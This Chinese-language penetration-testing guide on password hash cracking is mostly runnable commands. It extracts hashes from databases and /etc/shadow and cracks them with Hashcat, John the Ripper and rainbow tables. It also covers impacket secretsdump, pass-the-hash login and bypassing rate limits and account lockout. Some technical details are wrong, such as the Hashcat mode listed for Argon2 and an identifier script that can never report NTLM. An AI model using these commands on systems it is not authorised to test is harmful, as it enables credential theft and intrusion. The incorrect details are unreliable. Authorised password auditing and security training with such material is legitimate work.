# 哈希破解指南

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供密码哈希破解的系统性方法论。通过本指南，测试人员可以识别不同类型的密码哈希，选择合适的破解工具和技术，评估密码策略的安全性。

### 1.2 适用范围
本文档适用于以下场景：
- 数据库泄露的密码哈希分析
- 系统密码文件（/etc/shadow）破解
- Web 应用密码存储审计
- 彩虹表攻击评估
- 密码策略强度验证

### 1.3 读者对象
- 渗透测试工程师
- 密码安全审计人员
- 事件响应人员
- 安全研究员

---

## 第二部分：核心渗透技术专题

### 专题一：哈希破解

#### 2.1 技术介绍

**哈希破解**是通过各种技术手段从哈希值恢复原始密码的过程。由于哈希函数的单向性，破解主要依靠暴力破解、字典攻击、彩虹表等方法。

**常见密码哈希算法：**

| 算法 | 标识 | 强度 | Hashcat Mode | John Format |
|------|------|------|-------------|-------------|
| MD5 | 32 字符十六进制 | ❌ 弱 | 0 | raw-md5 |
| SHA1 | 40 字符十六进制 | ❌ 弱 | 100 | raw-sha1 |
| SHA256 | 64 字符十六进制 | ⚠️ 中 | 1400 | raw-sha256 |
| SHA512 | 128 字符十六进制 | ⚠️ 中 | 1700 | raw-sha512 |
| bcrypt | $2a$/$2b$/$2y$ | ✅ 强 | 3200 | bcrypt |
| scrypt | $7$ | ✅ 强 | 8900 | scrypt |
| Argon2 | $argon2$ | ✅ 强 | 10901 | argon2 |
| PBKDF2 | - | ✅ 强 | 10900 | pbkdf2 |
| NTLM | 32 字符十六进制 | ❌ 弱 | 1000 | nt |
| DES crypt | 13 字符 | ❌ 极弱 | 1500 | des |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 用户认证系统 | 登录功能 | 密码哈希存储，泄露后可破解 |
| API 认证 | API Key、Token | 弱哈希导致密钥可恢复 |
| 数据库存储 | 用户表 password 字段 | 未加盐或使用弱哈希算法 |
| 配置文件 | 数据库密码配置 | 硬编码密码哈希 |
| Cookie/Session | 记住我功能 | Cookie 中包含可破解的哈希 |
| 密码重置 | 重置令牌 | 令牌生成算法可逆 |

#### 2.3 漏洞检测方法

##### 2.3.1 哈希类型识别

```bash
# 使用 hash-identifier 工具
python3 hash-identifier.py

# 输入哈希值，工具会识别可能的算法类型

# 使用 HashID
hashid "5f4dcc3b5aa765d61d8327deb882cf99"

# 输出示例：
# MD5 : 5f4dcc3b5aa765d61d8327deb882cf99
# MD5(MD5()) : 5f4dcc3b5aa765d61d8327deb882cf99
```

##### 2.3.2 常见哈希格式识别

```python
#!/usr/bin/env python3
"""
哈希类型快速识别脚本
"""
import re

def identify_hash(hash_string):
    """识别哈希类型"""
    patterns = {
        'MD5': r'^[a-f0-9]{32}$',
        'SHA1': r'^[a-f0-9]{40}$',
        'SHA256': r'^[a-f0-9]{64}$',
        'SHA512': r'^[a-f0-9]{128}$',
        'NTLM': r'^[a-f0-9]{32}$',
        'bcrypt': r'^\$2[aby]?\$[0-9]{2}\$[./A-Za-z0-9]{53}$',
        'Argon2': r'^\$argon2[aid]?\$v=[0-9]+\$m=[0-9]+,t=[0-9]+,p=[0-9]+\$.+',
        'scrypt': r'^\$7\$[./A-Za-z0-9]{16}\$.+',
        'DES': r'^[a-zA-Z0-9./]{13}$',
        'MD5-Crypt': r'^\$1\$[./A-Za-z0-9]{8}\$[./A-Za-z0-9]{22}$',
        'SHA256-Crypt': r'^\$5\$[./A-Za-z0-9]{16}\$[./A-Za-z0-9]{43}$',
        'SHA512-Crypt': r'^\$6\$[./A-Za-z0-9]{16}\$[./A-Za-z0-9]{86}$',
    }
    
    for hash_type, pattern in patterns.items():
        if re.match(pattern, hash_string, re.IGNORECASE):
            return hash_type
    
    return "Unknown"

# 使用示例
hashes = [
    "5f4dcc3b5aa765d61d8327deb882cf99",  # MD5 of "password"
    "$2a$10$N9qo8uLOickgx2ZMRZoMye",  # bcrypt
    "$6$rounds=5000$saltsize$hash",  # SHA512-Crypt
]

for h in hashes:
    print(f"{h[:20]}... -> {identify_hash(h)}")
```

##### 2.3.3 数据库哈希提取

```sql
-- MySQL 密码哈希提取
SELECT user, host, authentication_string FROM mysql.user;

-- PostgreSQL 密码哈希提取
SELECT usename, passwd FROM pg_shadow;

-- Oracle 密码哈希提取
SELECT name, password FROM sys.user$;

-- MSSQL 密码哈希提取
SELECT name, password_hash FROM sys.sql_logins;
```

```bash
# Linux /etc/shadow 提取
cat /etc/shadow | cut -d: -f1,2

# 格式：username:$6$salt$hash:...
```

#### 2.4 漏洞利用方法

##### 2.4.1 使用 Hashcat 破解

```bash
# MD5 字典攻击
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# MD5 规则攻击（使用规则引擎生成变体）
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# MD5 掩码攻击（已知密码模式）
# 例如：8 位，前 4 位字母，后 4 位数字
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?d?d?d?d

# SHA256 暴力破解
hashcat -m 1400 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# bcrypt 破解（速度慢）
hashcat -m 3200 -a 0 hashes.txt wordlist.txt

# NTLM 破解（Windows 密码）
hashcat -m 1000 -a 0 nt_hashes.txt wordlist.txt

# 组合攻击（两个字典组合）
hashcat -m 0 -a 6 hashes.txt wordlist.txt wordlist2.txt

# 使用 GPU 加速
hashcat -m 0 -a 0 -d 1,2 hashes.txt wordlist.txt  # 使用 GPU 1 和 2

# 恢复会话
hashcat --session mysession --restore

# 显示破解结果
hashcat --show -m 0 hashes.txt
```

##### 2.4.2 使用 John the Ripper 破解

```bash
# 自动检测哈希类型并破解
john hashes.txt

# 指定格式破解
john --format=raw-md5 hashes.txt
john --format=bcrypt hashes.txt

# 使用字典攻击
john --wordlist=rockyou.txt hashes.txt

# 使用规则引擎
john --wordlist=rockyou.txt --rules hashes.txt

# 增量模式（暴力破解）
john --incremental hashes.txt

# 掩码攻击
john --mask=?l?l?l?l?d?d?d?d hashes.txt

# 显示结果
john --show hashes.txt

# 导出破解结果
john --show --format=csv hashes.txt > cracked.csv
```

##### 2.4.3 彩虹表攻击

```bash
# 使用 RainbowCrack
rtgen md5 loweralpha-numeric 1 8 0 3800 33554432 0 all
rtsort md5

# 查询彩虹表
rcrack ~/.rainbowcrack/*.rt -h "5f4dcc3b5aa765d61d8327deb882cf99"

# 在线彩虹表查询
# https://crackstation.net/
# https://md5decrypt.net/
```

##### 2.4.4 针对特定哈希的攻击

**MD5 破解：**
```bash
# MD5 速度极快，适合暴力破解
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# 在线查询
curl "https://md5decrypt.net/Api/api.php?hash=5f4dcc3b5aa765d61d8327deb882cf99&hash_type=md5&email=your@email.com"
```

**NTLM 破解（Windows）：**
```bash
# 提取 NTLM 哈希
impacket-secretsdump 'domain/user:password@target'

# 破解
hashcat -m 1000 -a 0 nt_hashes.txt wordlist.txt

# 传递哈希攻击（无需破解）
impacket-psexec -hashes :nthash user@target
```

**bcrypt 破解：**
```bash
# bcrypt 设计为抗暴力破解，速度慢
# 只能使用字典攻击
hashcat -m 3200 -a 0 bcrypt_hashes.txt rockyou.txt

# 使用多个 GPU 加速
hashcat -m 3200 -a 0 -d 1,2,3,4 bcrypt_hashes.txt rockyou.txt
```

##### 2.4.5 批量破解脚本

```python
#!/usr/bin/env python3
"""
批量哈希破解脚本
"""
import subprocess
import sys

def batch_crack(hash_file, wordlist, hash_type='0'):
    """批量破解哈希文件"""
    
    cmd = [
        'hashcat',
        '-m', hash_type,
        '-a', '0',
        '-o', 'cracked.txt',
        hash_file,
        wordlist
    ]
    
    print(f"[*] 启动破解：{' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    print(result.stdout)
    if result.stderr:
        print(result.stderr)
    
    # 显示结果
    try:
        with open('cracked.txt', 'r') as f:
            print("\n[+] 破解结果:")
            print(f.read())
    except FileNotFoundError:
        print("[-] 未破解任何哈希")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("用法：python crack.py <hash_file> <wordlist> [hash_type]")
        sys.exit(1)
    
    hash_file = sys.argv[1]
    wordlist = sys.argv[2]
    hash_type = sys.argv[3] if len(sys.argv) > 3 else '0'
    
    batch_crack(hash_file, wordlist, hash_type)
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过速率限制

```bash
# 当在线破解有速率限制时
# 方法 1: 使用代理池
# 方法 2: 降低请求频率
# 方法 3: 分布式破解

# 使用 Burp Intruder 绕过
# 配置多个线程，使用代理轮换
```

##### 2.5.2 绕过账户锁定

```bash
# 当有密码错误锁定策略时
# 方法：每个密码尝试使用不同用户名

# 或者先获取哈希再离线破解
# 避免在线尝试
```

---

## 第三部分：附录

### 3.1 Hashcat 哈希类型速查表

| ID | 算法 | 示例 |
|----|------|------|
| 0 | MD5 | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 100 | SHA1 | 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 |
| 1400 | SHA256 | 5e884898da28047d9166... |
| 1700 | SHA512 | b109f3bbbc244eb82441... |
| 1000 | NTLM | 8846f7eaee8fb117ad06... |
| 3200 | bcrypt | $2a$10$N9qo8uLOickgx2ZMRZoMye |
| 1500 | DES | 3U/v4gGHHGcFk |
| 10901 | Argon2 | $argon2id$v=19$m=65536... |

### 3.2 常用字典推荐

| 字典 | 用途 | 大小 |
|-----|------|------|
| rockyou.txt | 通用密码 | 14MB |
| crackstation-human-only.txt | 人类常用密码 | 1.5GB |
| probable-v2-wpa-top4800.txt | WiFi 密码 | 小 |
| xato-net-10-million-passwords.txt | 1000 万常用密码 | 大 |

### 3.3 常用规则文件

| 规则 | 说明 |
|-----|------|
| best64.rule | 64 条最佳规则 |
| OneRuleToRuleThemAll.rule | 综合规则 |
| InsidePro-Hashkiller.rule | Hashkiller 规则 |
| T0XlC.rule | T0XlC 规则集 |

### 3.4 密码安全建议

**存储建议：**
- 使用 Argon2、bcrypt 或 scrypt
- 每个密码使用唯一盐值
- 盐值至少 16 字节
- 迭代次数/工作因子足够高

**策略建议：**
- 最小长度 12 字符
- 要求复杂度（大小写、数字、符号）
- 检查常见密码字典
- 实施多因素认证

---

## 参考资源

- [Hashcat Documentation](https://hashcat.net/hashcat/)
- [John the Ripper Wiki](https://github.com/openwall/john)
- [CrackStation Password Cracking Dictionary](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [Have I Been Pwned](https://haveibeenpwned.com/Passwords)
